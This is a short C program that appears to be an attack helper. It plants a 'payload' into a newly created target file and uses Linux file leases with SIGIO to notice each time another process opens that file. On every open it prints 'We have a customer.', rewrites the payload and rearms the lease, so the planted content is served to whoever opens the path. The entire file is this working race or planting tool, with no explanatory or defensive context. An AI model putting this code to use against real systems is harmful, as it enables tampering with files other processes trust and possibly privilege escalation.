#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <signal.h>
#include <string.h>

#include <sys/types.h>
#include <sys/stat.h>

#define BUFSZ 4096

void write_payload(
    int targetfd,
    int payloadfd)
{
  int i=0, t;
  char buf[BUFSZ];
  memset(buf, 0, BUFSZ);

  struct stat st;
  /* Write payload into file */
  if (fstat(payloadfd, &st) < 0)
    err(EXIT_FAILURE, "Could not fetch payload size");

  while (i < st.st_size) {
    if ((t = read(payloadfd, buf, BUFSZ)) < 0)
      err(EXIT_FAILURE, "Cannot read from payload file");
    else if (t == 0)
      break;

    if (write(targetfd, buf, t) < 0)
      err(EXIT_FAILURE, "Cannot write to target file");

    i += t;
  }
  lseek(payloadfd, 0, SEEK_SET);
  lseek(targetfd, 0, SEEK_SET);
}

int main(
    const int argc,
    const char **argv)
{
  struct sigaction act;
  sigset_t sigs;
  int io = SIGIO;

  sigemptyset(&sigs);
  sigaddset(&sigs, SIGIO);

  if (argc < 3)
    errx(EXIT_FAILURE, "Insufficient arguments, provide target file and payload file");

  int payloadfd = open(argv[2], O_RDONLY);
  if (payloadfd < 0)
    err(EXIT_FAILURE, "Cannot open payload file %s", argv[2]);

  int targetfd = open(argv[1], O_CREAT|O_EXCL|O_WRONLY, 0666);
  if (targetfd < 0)
    err(EXIT_FAILURE, "Cannot open target file %s", argv[1]);

  /* Setup signal handler */
  if (sigprocmask(SIG_BLOCK, &sigs, NULL) < 0)
    err(EXIT_FAILURE, "Cannot setup signal handler");

  memset(&act, 0, sizeof(act));

  /* Set a lease on the file */
  write_payload(targetfd, payloadfd);
  if (fcntl(targetfd, F_SETLEASE, F_WRLCK) < 0)
    err(EXIT_FAILURE, "Cannot set lease");

  while (1) {
    if (sigwait(&sigs, &io) < 0)
      err(EXIT_FAILURE, "Cannot read pending signals");

    if (io == SIGIO) {
      printf("We have a customer.\n");
      write_payload(targetfd, payloadfd);
      if (fcntl(targetfd, F_SETLEASE, F_UNLCK) < 0)
        err(EXIT_FAILURE, "Cannot reset lease");
      while (fcntl(targetfd, F_SETLEASE, F_WRLCK) < 0) {
        if (errno == EAGAIN)
          continue;
        else
          err(EXIT_FAILURE, "Cannot set write lease");
      }
      printf("Rearmed payload..\n");

    }
  }   
}
